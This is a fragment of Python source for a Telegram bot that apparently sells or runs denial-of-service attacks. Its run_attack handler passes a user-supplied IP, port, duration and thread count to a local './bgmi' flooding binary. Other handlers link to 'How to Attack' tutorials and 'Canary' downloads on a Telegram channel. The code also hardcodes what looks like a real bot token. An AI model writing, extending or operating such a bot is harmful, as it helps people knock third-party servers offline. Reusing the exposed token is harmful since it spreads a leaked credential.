...
# Bot token
BOT_TOKEN = '7901196184:AAGR4o7OjdyvtI0hLFnH7HJPVqQKuqiAlxY'  # Replace with your bot token
...
async def run_attack(ip, port, time_duration, update, user_id):
    ...
    try:
        command = f"./bgmi {ip} {port} {time_duration} {9} {default_thread}"
...
async def howtoattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Learn How to Attack:*\n"
        f"[Watch the Tutorial](https://t.me/SarkarBhaiii/795)",
        parse_mode="Markdown"
    )
...
async def canary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📱Android Canary📱", url="https://t.me/SarkarBhaiii/713")],
